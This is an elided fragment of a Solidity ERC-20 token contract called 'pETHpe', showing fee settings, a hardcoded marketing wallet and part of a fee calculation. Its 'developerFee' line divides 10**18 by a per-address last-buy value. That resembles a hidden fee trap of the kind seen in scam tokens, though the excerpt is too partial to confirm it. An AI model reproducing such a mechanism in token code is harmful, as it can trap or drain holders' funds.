...
contract pETHpe is Context, IERC20, Ownable {
    ...
    string private constant _name = "pETHpe"; //
    string private constant _symbol = unicode"PP"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 1;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x9CF3C8D8E24e21D237454Db7688aFac670D6CDa4;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 developerFee = (10**18)/(1+_LastBuy[from]);
